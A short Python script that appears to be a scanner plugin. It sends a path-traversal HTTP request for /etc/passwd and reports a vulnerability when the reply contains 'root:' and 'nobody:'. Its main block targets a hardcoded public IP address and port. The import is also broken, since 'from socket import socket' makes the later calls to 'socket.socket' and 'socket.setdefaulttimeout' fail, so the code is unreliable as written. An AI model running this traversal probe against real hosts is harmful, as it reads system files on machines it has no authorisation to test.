# coding:utf-8
from socket import socket


def check(ip, port, timeout):
    try:
        socket.setdefaulttimeout(timeout)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, int(port)))
        flag = "GET /../../../../../../../../../etc/passwd HTTP/1.1\r\n\r\n"
        s.send(flag)
        data = s.recv(1024)
        s.close()
        if 'root:' in data and 'nobody:' in data:
            return u"漏洞"
        else:
            return u"无"
    except:
        pass


if __name__ == '__main__':
    print(check('119.3.12.54',8888,60))